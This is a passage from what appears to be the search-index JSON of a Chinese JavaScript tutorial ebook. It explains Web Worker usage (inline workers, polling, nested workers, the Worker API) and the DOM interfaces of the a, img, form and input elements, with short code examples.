\u811a\u672c\u6587\u4ef6\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u8f7d\u5165\u4e0e\u4e3b\u7ebf\u7a0b\u5728\u540c\u4e00\u4e2a\u7f51\u9875\u7684\u4ee3\u7801\u3002</p> <pre><code>&lt;!DOCTYPE html&gt;\n  &lt;body&gt;\n    &lt;script id=\"worker\" type=\"app/worker\"&gt;\n      addEventListener('message', function () {\n        postMessage('some message');\n      }, false);\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u4e0a\u9762\u662f\u4e00\u6bb5\u5d4c\u5165\u7f51\u9875\u7684\u811a\u672c\uff0c\u6ce8\u610f\u5fc5\u987b\u6307\u5b9a<code>&lt;script&gt;</code>\u6807\u7b7e\u7684<code>type</code>\u5c5e\u6027\u662f\u4e00\u4e2a\u6d4f\u89c8\u5668\u4e0d\u8ba4\u8bc6\u7684\u503c\uff0c\u4e0a\u4f8b\u662f<code>app/worker</code>\u3002</p> <p>\u7136\u540e\uff0c\u8bfb\u53d6\u8fd9\u4e00\u6bb5\u5d4c\u5165\u9875\u9762\u7684\u811a\u672c\uff0c\u7528 Worker \u6765\u5904\u7406\u3002</p> <pre><code>var blob = new Blob([document.querySelector('#worker').textContent]);\nvar url = window.URL.createObjectURL(blob);\nvar worker = new Worker(url);\n\nworker.onmessage = function (e) {\n  // e.data === 'some message'\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u5c06\u5d4c\u5165\u7f51\u9875\u7684\u811a\u672c\u4ee3\u7801\uff0c\u8f6c\u6210\u4e00\u4e2a\u4e8c\u8fdb\u5236\u5bf9\u8c61\uff0c\u7136\u540e\u4e3a\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u5bf9\u8c61\u751f\u6210 URL\uff0c\u518d\u8ba9 Worker \u52a0\u8f7d\u8fd9\u4e2a URL\u3002\u8fd9\u6837\u5c31\u505a\u5230\u4e86\uff0c\u4e3b\u7ebf\u7a0b\u548c Worker \u7684\u4ee3\u7801\u90fd\u5728\u540c\u4e00\u4e2a\u7f51\u9875\u4e0a\u9762\u3002</p>"},{"location":"ebook-JS-basic/10-5-web-worker/#worker_3","title":"\u5b9e\u4f8b\uff1aWorker \u7ebf\u7a0b\u5b8c\u6210\u8f6e\u8be2","text":"<p>\u6709\u65f6\uff0c\u6d4f\u89c8\u5668\u9700\u8981\u8f6e\u8be2\u670d\u52a1\u5668\u72b6\u6001\uff0c\u4ee5\u4fbf\u7b2c\u4e00\u65f6\u95f4\u5f97\u77e5\u72b6\u6001\u6539\u53d8\u3002\u8fd9\u4e2a\u5de5\u4f5c\u53ef\u4ee5\u653e\u5728 Worker \u91cc\u9762\u3002</p> <pre><code>function createWorker(f) {\n  var blob = new Blob(['(' + f.toString() + ')()']);\n  var url = window.URL.createObjectURL(blob);\n  var worker = new Worker(url);\n  return worker;\n}\n\nvar pollingWorker = createWorker(function (e) {\n  var cache;\n\n  function compare(new, old) { ... };\n\n  setInterval(function () {\n    fetch('/my-api-endpoint').then(function (res) {\n      var data = res.json();\n\n      if (!compare(data, cache)) {\n        cache = data;\n        self.postMessage(data);\n      }\n    })\n  }, 1000)\n});\n\npollingWorker.onmessage = function () {\n  // render data\n}\n\npollingWorker.postMessage('init');\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cWorker \u6bcf\u79d2\u949f\u8f6e\u8be2\u4e00\u6b21\u6570\u636e\uff0c\u7136\u540e\u8ddf\u7f13\u5b58\u505a\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u4e00\u81f4\uff0c\u5c31\u8bf4\u660e\u670d\u52a1\u7aef\u6709\u4e86\u65b0\u7684\u53d8\u5316\uff0c\u56e0\u6b64\u5c31\u8981\u901a\u77e5\u4e3b\u7ebf\u7a0b\u3002</p>"},{"location":"ebook-JS-basic/10-5-web-worker/#worker-worker","title":"\u5b9e\u4f8b\uff1a Worker \u65b0\u5efa Worker","text":"<p>Worker \u7ebf\u7a0b\u5185\u90e8\u8fd8\u80fd\u518d\u65b0\u5efa Worker \u7ebf\u7a0b\uff08\u76ee\u524d\u53ea\u6709 Firefox \u6d4f\u89c8\u5668\u652f\u6301\uff09\u3002\u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u5c06\u4e00\u4e2a\u8ba1\u7b97\u5bc6\u96c6\u7684\u4efb\u52a1\uff0c\u5206\u914d\u523010\u4e2a Worker\u3002</p> <p>\u4e3b\u7ebf\u7a0b\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>var worker = new Worker('worker.js');\nworker.onmessage = function (event) {\n  document.getElementById('result').textContent = event.data;\n};\n</code></pre> <p>Worker \u7ebf\u7a0b\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>// worker.js\n\n// settings\nvar num_workers = 10;\nvar items_per_worker = 1000000;\n\n// start the workers\nvar result = 0;\nvar pending_workers = num_workers;\nfor (var i = 0; i &lt; num_workers; i += 1) {\n  var worker = new Worker('core.js');\n  worker.postMessage(i * items_per_worker);\n  worker.postMessage((i + 1) * items_per_worker);\n  worker.onmessage = storeResult;\n}\n\n// handle the results\nfunction storeResult(event) {\n  result += event.data;\n  pending_workers -= 1;\n  if (pending_workers &lt;= 0)\n    postMessage(result); // finished!\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cWorker \u7ebf\u7a0b\u5185\u90e8\u65b0\u5efa\u4e8610\u4e2a Worker \u7ebf\u7a0b\uff0c\u5e76\u4e14\u4f9d\u6b21\u5411\u8fd910\u4e2a Worker \u53d1\u9001\u6d88\u606f\uff0c\u544a\u77e5\u4e86\u8ba1\u7b97\u7684\u8d77\u70b9\u548c\u7ec8\u70b9\u3002\u8ba1\u7b97\u4efb\u52a1\u811a\u672c\u7684\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>// core.js\nvar start;\nonmessage = getStart;\nfunction getStart(event) {\n  start = event.data;\n  onmessage = getEnd;\n}\n\nvar end;\nfunction getEnd(event) {\n  end = event.data;\n  onmessage = null;\n  work();\n}\n\nfunction work() {\n  var result = 0;\n  for (var i = start; i &lt; end; i += 1) {\n    // perform some complex calculation here\n    result += 1;\n  }\n  postMessage(result);\n  close();\n}\n</code></pre>"},{"location":"ebook-JS-basic/10-5-web-worker/#api","title":"API","text":""},{"location":"ebook-JS-basic/10-5-web-worker/#_6","title":"\u4e3b\u7ebf\u7a0b","text":"<p>\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b<code>Worker()</code>\u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u4f9b\u4e3b\u7ebf\u7a0b\u751f\u6210 Worker \u7ebf\u7a0b\u3002</p> <pre><code>var myWorker = new Worker(jsUrl, options);\n</code></pre> <p><code>Worker()</code>\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u811a\u672c\u7684\u7f51\u5740\uff08\u5fc5\u987b\u9075\u5b88\u540c\u6e90\u653f\u7b56\uff09\uff0c\u8be5\u53c2\u6570\u662f\u5fc5\u9700\u7684\uff0c\u4e14\u53ea\u80fd\u52a0\u8f7d JS \u811a\u672c\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u914d\u7f6e\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u53ef\u9009\u3002\u5b83\u7684\u4e00\u4e2a\u4f5c\u7528\u5c31\u662f\u6307\u5b9a Worker \u7684\u540d\u79f0\uff0c\u7528\u6765\u533a\u5206\u591a\u4e2a Worker \u7ebf\u7a0b\u3002</p> <pre><code>// \u4e3b\u7ebf\u7a0b\nvar myWorker = new Worker('worker.js', { name : 'myWorker' });\n\n// Worker \u7ebf\u7a0b\nself.name // myWorker\n</code></pre> <p><code>Worker()</code>\u6784\u9020\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a Worker \u7ebf\u7a0b\u5bf9\u8c61\uff0c\u7528\u6765\u4f9b\u4e3b\u7ebf\u7a0b\u64cd\u4f5c Worker\u3002Worker \u7ebf\u7a0b\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5982\u4e0b\u3002</p> <ul> <li>Worker.onerror\uff1a\u6307\u5b9a error \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002</li> <li>Worker.onmessage\uff1a\u6307\u5b9a message \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u53d1\u9001\u8fc7\u6765\u7684\u6570\u636e\u5728<code>Event.data</code>\u5c5e\u6027\u4e2d\u3002</li> <li>Worker.onmessageerror\uff1a\u6307\u5b9a messageerror \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u53d1\u9001\u7684\u6570\u636e\u65e0\u6cd5\u5e8f\u5217\u5316\u6210\u5b57\u7b26\u4e32\u65f6\uff0c\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002</li> <li>Worker.postMessage()\uff1a\u5411 Worker \u7ebf\u7a0b\u53d1\u9001\u6d88\u606f\u3002</li> <li>Worker.terminate()\uff1a\u7acb\u5373\u7ec8\u6b62 Worker \u7ebf\u7a0b\u3002</li> </ul>"},{"location":"ebook-JS-basic/10-5-web-worker/#worker_4","title":"Worker \u7ebf\u7a0b","text":"<p>Web Worker \u6709\u81ea\u5df1\u7684\u5168\u5c40\u5bf9\u8c61\uff0c\u4e0d\u662f\u4e3b\u7ebf\u7a0b\u7684<code>window</code>\uff0c\u800c\u662f\u4e00\u4e2a\u4e13\u95e8\u4e3a Worker \u5b9a\u5236\u7684\u5168\u5c40\u5bf9\u8c61\u3002\u56e0\u6b64\u5b9a\u4e49\u5728<code>window</code>\u4e0a\u9762\u7684\u5bf9\u8c61\u548c\u65b9\u6cd5\u4e0d\u662f\u5168\u90e8\u90fd\u53ef\u4ee5\u4f7f\u7528\u3002</p> <p>Worker \u7ebf\u7a0b\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u5168\u5c40\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <ul> <li>self.name\uff1a Worker \u7684\u540d\u5b57\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u7531\u6784\u9020\u51fd\u6570\u6307\u5b9a\u3002</li> <li>self.onmessage\uff1a\u6307\u5b9a<code>message</code>\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002</li> <li>self.onmessageerror\uff1a\u6307\u5b9a messageerror \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u53d1\u9001\u7684\u6570\u636e\u65e0\u6cd5\u5e8f\u5217\u5316\u6210\u5b57\u7b26\u4e32\u65f6\uff0c\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002</li> <li>self.close()\uff1a\u5173\u95ed Worker \u7ebf\u7a0b\u3002</li> <li>self.postMessage()\uff1a\u5411\u4ea7\u751f\u8fd9\u4e2a Worker \u7ebf\u7a0b\u53d1\u9001\u6d88\u606f\u3002</li> <li>self.importScripts()\uff1a\u52a0\u8f7d JS \u811a\u672c\u3002</li> </ul>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/","title":"11-\u7f51\u9875\u5143\u7d20\u63a5\u53e3","text":""},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_1","title":"\u9644\u5f55 \u7f51\u9875\u5143\u7d20\u63a5\u53e3","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 21385  \u9605\u8bfb43\u5206\u949f</p> <p>2021-11-21 2023-04-10</p>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#a","title":"<code>&lt;a\\&gt;</code>","text":"<p>A\u5143\u7d20\u8868\u793a\u94fe\u63a5\uff0c\u7ee7\u627f\u4e86Node\u3001element \u5143\u7d20\u7684API\uff0c\u540c\u65f6\u5177\u6709 AnchorElement\uff0cHTMLHyperlinkElementUtils</p> <p>\u4e0b\u9762\u662f\u4e3b\u8981\u7684\u5c5e\u6027\u548c\u65b9\u6cd5</p>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#1url","title":"1\u3001URL","text":"<p>\u7c7b\u4f3c\u4e8eLocation\u5bf9\u8c61\u7684\u5c5e\u6027</p> <pre><code>// &lt;a id=\"test\" href=\"http://user:passwd@example.com:8081/index.html?bar=1#foo\"&gt;test&lt;/a&gt;\nlet a = document.getElementById('test');\n</code></pre> <p>a.hash</p> <p>a.host</p> <p>a.hostname</p> <p>a.href</p> <p>a.origin</p> <p>a.pathname</p> <p>a.port</p> <p>a.prototol</p> <p>a.search</p>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#2","title":"2\u3001\u5c5e\u6027","text":"<ul> <li> <p>AccessKey \u5feb\u6377\u952e   a.accessKey = 'k';   // \u6309\u4e0b\u5feb\u6377\u952e\u4f1a\u8df3\u8f6c\u5230\u8fd9\u4e2a\u94fe\u63a5(\u6d4f\u89c8\u5668\u517c\u5bb9\u6027)</p> </li> <li> <p>download    a.download = 'test.png';   \u5982\u679c\u4e00\u4e2a\u94fe\u63a5\u662f\u4e00\u4e2a\u56fe\u7247\u6216\u8005\u662f\u6587\u4ef6\uff0c\u90a3\u4e48\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u540e\uff0c\u70b9\u51fb\u94fe\u63a5\u4f1a\u4e0b\u8f7d\u6587\u4ef6\uff08\u5f39\u51fa\u53e6\u5b58\u4e3a\u5bf9\u8bdd\u6846\u63d0\u793a\u7528\u6237\u4fdd\u5b58\uff0c\u8fd9\u91cc\u8bbe\u7f6e\u7684\u662f\u4e0b\u8f7d\u7684\u6587\u4ef6\u540d\uff09</p> </li> <li> <p>hreflang = 'en' \u8bbe\u7f6e\u8df3\u8f6c\u5230\u76ee\u6807\u7f51\u9875\u7684\u8bed\u8a00</p> </li> <li> <p>referrerPolicy \u53ef\u4ee5\u8bbe\u7f6e\u70b9\u51fb\u94fe\u63a5\u540e\uff0c\u8bbe\u7f6eHTTP\u8bf7\u6c42\u5934\u7684referer\u5b57\u6bb5\uff08\u8fd9\u4e2a\u5b57\u6bb5\u8868\u793a\u4ece\u4ec0\u4e48\u5730\u65b9\u6765\u7684\uff09\u53ef\u4ee5\u8bbe\u7f6e\u4e09\u4e2a\u503c\uff1a\u8868\u793a\u4e0d\u53d1\u9001referer\u5b57\u6bb5\uff0c\u53d1\u9001origin\uff0c\u53d1\u9001origin+path(\u4e0d\u5305\u62ec\u4e95\u53f7\u7247\u6bb5\uff0c\u53ef\u80fd\u4fe1\u606f\u6cc4\u9732)   a.refererPolicy = 'no-referer' 'origin' 'unsafe-url';</p> </li> <li> <p>rel \u8868\u793a\u94fe\u63a5\u548c\u5f53\u524d\u6587\u6863\u7684\u5173\u7cfb a.rel = 'license';</p> </li> <li> <p>tabIndex \u8868\u793a\u4f7f\u7528Tab\u952e\u904d\u5386\u7684\u987a\u5e8f\uff08\u6570\u503c\uff09 a.tabIndex = 3;</p> </li> <li> <p>a.target = '_blank' \u53ef\u4ee5\u8bfb\u5199target\u5c5e\u6027\uff08\u6253\u5f00\u65b0\u7684\u7a97\u53e3\uff09</p> </li> <li> <p>text \u5c5e\u6027\uff0c\u8868\u793a textContent a.text</p> </li> <li> <p>type \u8bbe\u7f6e\u94fe\u63a5\u7684mime\u5c5e\u6027 a.type = 'video/'</p> </li> </ul>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#3","title":"3\u3001\u65b9\u6cd5","text":"<p>a.blur()</p> <p>a.focus()</p> <p>a.toString()</p>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#img","title":"<code>&lt;img\\&gt;</code>","text":"<p>\u6784\u9020\u51fd\u6570\u521b\u5efa\u5bf9\u8c61</p> <pre><code>let img = new Image(100, 200);\nimg.src = 'pic.png';\ndocument.body.appendChild(img);\n</code></pre> <p>\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u83b7\u53d6</p> <pre><code>document.images[0] instanceof HTMLImageElement\n\nlet img = document.getElementById('photo');\nimg instanceof HTMLImageElement\n\nlet img = document.createElement('img');\nimg instanceof HTMLImageElement\n</code></pre>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_2","title":"\u5c5e\u6027","text":"<ul> <li>img.src \u83b7\u53d6\u56fe\u50cf\u7684\u5b8c\u6574\u7f51\u5740</li> <li>currentSrc \u8fd4\u56de\u5f53\u524d\u6b63\u5728\u663e\u793a\u7684\u56fe\u7247\u7684\u7f51\u5740\uff08JS\u548cCSS\u7684\u5a92\u4f53\u67e5\u8be2\u53ef\u80fd\u6539\u53d8\u5f53\u524d\u663e\u793a\u56fe\u7247\u7684src\uff09</li> <li>alt \u8fd4\u56de\u6587\u5b57\u8bf4\u660e</li> <li>isMap \u56fe\u50cf\u662f\u5426\u662f\u670d\u52a1\u5668\u7aef\u56fe\u50cf\u6620\u5c04\u7684\u4e00\u90e8\u5206</li> <li> <p>useMap \u8bbe\u7f6e\u5f53\u524d\u56fe\u50cf\u5bf9\u5e94\u7684MAP\u5143\u7d20</p> </li> <li> <p>img.width img.height \u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u5bbd\u9ad8\uff0c\u8fd4\u56de\u503c\u662f\u56fe\u7247\u7684\u539f\u59cb\u5bbd\u9ad8\uff1b\u5982\u679c\u56fe\u7247\u6ca1\u6709\u52a0\u8f7d\uff0c\u8fd4\u56de\u503c\u662f0.</p> </li> <li>img.naturalWidth img.naturalHeight \u83b7\u53d6\u56fe\u7247\u539f\u59cb\u7684\u9ad8\u5ea6</li> <li>img.complete \u8868\u793a\u56fe\u7247\u662f\u5426\u52a0\u8f7d\u5b8c\u6210\uff08\u5982\u679c\u6ca1\u6709src\u5c5e\u6027\uff0c\u8fd9\u4e2a\u8fd4\u56de\u7684\u4e5f\u662ftrue\uff09</li> <li>img.crossOrigin \u8868\u793a\u8de8\u57df\u8bf7\u6c42\u662f\u5426\u8981\u6c42\u7528\u6237\u8eab\u4efd\uff1a'anonymous' 'use-credentials' \u9ed8\u8ba4\u524d\u8005\u4e0d\u8981\u6c42\u8eab\u4efd</li> <li>img.referrerPolicy \u8fd9\u91cc\u7c7b\u4f3ca\u6807\u7b7e\uff1a\u8868\u793a\u8bf7\u6c42\u56fe\u50cf\u8d44\u6e90\u65f6\uff0c\u5982\u4f55\u5904\u7406 HTTP \u8bf7\u6c42\u7684referrer\u5b57\u6bb5\u3002</li> <li>img.x img.y \u8fd4\u56de\u56fe\u50cf\u8ddd\u79bb\u5de6\u4e0a\u89d2\u7684XY\u5750\u6807</li> </ul>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_3","title":"\u4e8b\u4ef6","text":"<pre><code>&lt;img onload=\"loadImg()\" onerror=\"loadError()\"/&gt;\n</code></pre> <p>\u56fe\u7247\u54cd\u5e94\u5f0f\u52a0\u8f7d</p> <pre><code>img.srcset\nimg.sizes\n\nvar img = document.getElementById('myImg');\nconsole.log(img.srcset)\n// \"example-320w.jpg 320w,\n//  example-480w.jpg 480w,\n//  example-800w.jpg 800w\"\n// \u6839\u636e\u4e0b\u9762\u7684\u5c3a\u5bf8\uff0c\u663e\u793a\u6700\u63a5\u8fd1\u8ba1\u7b97\u503c\u7684\u56fe\u7247\n\nconsole.log(img.sizes)\n// \"(max-width: 320px) 280px,\n//  (max-width: 480px) 440px,\n//  800px\"\n// \u5982\u679c\u5c4f\u5e55\u5c0f\u4e8e320px, \u56fe\u7247\u663e\u793a 280px;\u5c4f\u5e55\u5728 320-480 \u663e\u793a\u56fe\u7247 440px\uff0c\u4ee5\u6b64\u7c7b\u63a8\n</code></pre>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#form","title":"<code>&lt;form\\&gt;</code>","text":"<pre><code>let form = document.getElementById('form');\nlet f = document.createElement('form');\ndocument.body.appendChild(f);\nf.action = '/test/test.php';\nf.method = 'GET';\nf.submit();\n</code></pre> <ul> <li>form.elements \u8fd4\u56de\u4f2a\u6570\u7ec4\uff0c\u662f\u8868\u5355\u7684\u6240\u6709\u63a7\u4ef6</li> <li>form.length \u8868\u5355\u63a7\u4ef6\u7684\u6570\u91cf</li> <li>form.name</li> <li>form.method === 'POST'</li> <li>form.target \u670d\u52a1\u5668\u8fd4\u56de\u540e\uff0c\u6570\u636e\u663e\u793a\u7684\u4f4d\u7f6e</li> <li>form.action \u8868\u5355\u63d0\u4ea4\u6570\u636e\u7684URL</li> <li>form.enctype form.encoding \u8868\u5355\u7684\u7f16\u7801\u65b9\u6cd5 'application/x-www-form-urlencoded`\u3001multipart/form-data\u548ctext/plain'</li> <li>form.acceptCharset \u8fd4\u56de\u670d\u52a1\u5668\u53ef\u4ee5\u63a5\u53d7\u7684\u5b57\u7b26\u7f16\u7801</li> <li>form.autocomplete \u6d4f\u89c8\u5668\u662f\u5426\u5bf9input\u63a7\u4ef6\u81ea\u52a8\u8865\u5168</li> <li>form.noValidate \u662f\u5426\u5173\u95ed\u8868\u5355\u7684\u81ea\u52a8\u6821\u9a8c</li> <li>form.submit(); \u4e0d\u4f1a\u89e6\u53d1\u8868\u5355\u7684submit\u4e8b\u4ef6\u548c\u81ea\u52a8\u6821\u9a8c\u3002</li> <li>form.reset();</li> <li>form.checkValidity(); \u81ea\u52a8\u6821\u9a8c\uff0c\u5982\u679c\u662ffalse\uff0c\u89e6\u53d1invalid\u4e8b\u4ef6</li> </ul>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#input","title":"<code>&lt;input\\&gt;</code>","text":"<p>input \u7ec4\u4ef6\u7ee7\u627f\u4e86 HTMLInputElement \u7ec4\u4ef6\u7684API\uff0cinput\u79cd\u7c7b\u5f88\u591a\uff0c\u6240\u4ee5\u5c5e\u6027\u4e0d\u540c</p>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_4","title":"\u57fa\u672c\u5c5e\u6027","text":"<pre><code>input.name\ninput.type\ninput.disabled\ninput.autofocus\ninput.value\ninput.required \u662f\u5426\u4e3a\u5fc5\u586b\u9879\ninput.validity \u53ea\u8bfb\uff0c\u8fd4\u56deinput\u7684\u6821\u9a8c\u60c5\u51b5\uff0c\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\ninput.validationMessage \u53ea\u8bfb\uff0c\u8868\u793a\u6821\u9a8c\u5931\u8d25\u540e\u7528\u6237\u770b\u5230\u7684\u4fe1\u606f\ninput.willValidate \u53ea\u8bfb\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\uff0c\u8fd9\u4e2a\u8f93\u5165\u6846\u662f\u5426\u88ab\u6821\u9a8c\n</code></pre>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_5","title":"\u8868\u5355\u5c5e\u6027","text":"<pre><code>input.form \u8fd4\u56deinput\u6240\u5728\u7684form\u8282\u70b9\nformAction \u6539\u53d8\u8868\u5355\u5143\u7d20\u7684action\u5c5e\u6027\nformEnctype \u8fd4\u56de\u8868\u5355\u7684\u7f16\u7801\u65b9\u5f0f\nformMethod \nformValidate\nformTarget\n</code></pre>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_6","title":"\u6587\u672c\u8f93\u5165\u6846\u5c5e\u6027","text":"<p>input type='text'</p> <pre><code>autocomplete = 'off' 'on' \u662f\u5426\u53ef\u4ee5\u88ab\u81ea\u52a8\u8865\u5168\nmaxLength \u8868\u793a\u6700\u5927\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u6570\nsize \u8868\u793ainput\u8282\u70b9\u7684\u663e\u793a\u957f\u5ea6\uff08\u6216\u8005\u5b57\u7b26\u4e2a\u6570\uff09\npattern input\u7684\u503c\u9700\u8981\u7b26\u5408\u6b63\u5219\u8868\u8fbe\u5f0f\nplaceholder(\u4e0d\u80fd\u5305\u62ec\u56de\u8f66\u548c\u6362\u884c)\nreadOnly\nmin max \u8868\u793a\u8fd9\u4e2a\u8f93\u5165\u6846\u7684\u6700\u5927\u6700\u5c0f\u6570\u503c\u548c\u65e5\u671f\nselectionStart selectionEnd \u8868\u793a\u9009\u4e2d\u6587\u672c\u7684\u5f00\u59cb\u6216\u8005\u7ed3\u675f\u4f4d\u7f6e\nselectionDirection \u8868\u793a\u9009\u4e2d\u6587\u672c\u7684\u65b9\u5411\uff08\u6b63\u5411\u53cd\u5411\uff09\n</code></pre>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_7","title":"\u9009\u62e9\u6846\u5c5e\u6027","text":"<p>checkbox \u590d\u9009\u6846 radio \u5355\u9009\u6846</p> <pre><code>checked \u8868\u793a\u662f\u5426\u88ab\u9009\u4e2d\ndefaultChecked \u8868\u793a\u662f\u5426\u9ed8\u8ba4\u9009\u4e2d\nindeterminate \u8868\u793a\u8be5&lt;input&gt;\u5143\u7d20\u662f\u5426\u8fd8\u6ca1\u6709\u786e\u5b9a\u7684\u72b6\u6001\u3002\u4e00\u65e6\u7528\u6237\u70b9\u51fb\u8fc7\u4e00\u6b21\uff0c\u8be5\u5c5e\u6027\u5c31\u4f1a\u53d8\u6210false\uff0c\u8868\u793a\u7528\u6237\u5df2\u7ecf\u7ed9\u51fa\u786e\u5b9a\u7684\u72b6\u6001\u4e86\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002(\u8fd9\u4e2a\u5355\u8bcd\u610f\u601d\uff1a\u4e0d\u786e\u5b9a\u7684)\n</code></pre>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_8","title":"\u56fe\u50cf\u5c5e\u6027","text":"<p>input type='image' \u5c5e\u6027 alt height src width</p>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_9","title":"\u6587\u4ef6\u4e0a\u4f20\u5c5e\u6027","text":"<p>input type='file' accept='text/plain' files \u53ef\u4ee5\u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6\u5bf9\u8c61\u4f2a\u6570\u7ec4</p>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_10","title":"\u5176\u4ed6\u5c5e\u6027","text":"<pre><code>defaultValue\ndirName \u6587\u5b57\u65b9\u5411\naccessKey \u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8ba9input\u83b7\u5f97\u7126\u70b9\u7684\u5feb\u6377\u952e\nlist \u8fd4\u56de\u4e00\u4e2adatalist\nmultiple \u662f\u5426\u9009\u62e9\u591a\u4e2a\u503c\nlabels \u8fd4\u56de\u4e00\u4e2a\u8282\u70b9List \u8868\u793a\u5f53\u524dinput\u7684label\u5143\u7d20\nstep \u8868\u793a\u5728\u4e00\u4e2a\u533a\u95f4\u5185\uff08min-max\uff09\u6bcf\u6b21\u589e\u51cf\u7684\u6570\u503c\u6216\u8005\u65f6\u95f4\nvalueAsDate \u8bbe\u7f6e\u6307\u5b9a\u7684\u65e5\u671f\uff08input\u5143\u7d20\uff09\nvalueAsNumber \u8bbe\u7f6e\u6307\u5b9a\u7684\u6570\u503c\n</code></pre>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_11","title":"\u65b9\u6cd5","text":"<ul> <li><code>focus()</code>\uff1a\u5f53\u524d<code>&lt;input&gt;</code>\u5143\u7d20\u83b7\u5f97\u7126\u70b9\u3002</li> <li><code>blur()</code>\uff1a\u79fb\u9664<code>&lt;input&gt;</code>\u5143\u7d20\u7684\u7126\u70b9\u3002</li> <li><code>select()</code>\uff1a\u9009\u4e2d<code>&lt;input&gt;</code>\u5143\u7d20\u5185\u90e8\u7684\u6240\u6709\u6587\u672c\u3002\u6700\u597d\u5148\u7528<code>focus()</code>\u65b9\u6cd5\u805a\u7126\uff0c\u518d\u7528\u8fd9\u4e2a\u65b9\u6cd5\u83b7\u53d6\u5185\u90e8\u6587\u672c</li> <li><code>click()</code>\uff1a\u6a21\u62df\u9f20\u6807\u70b9\u51fb\u5f53\u524d\u7684<code>&lt;input&gt;</code>\u5143\u7d20\u3002</li> 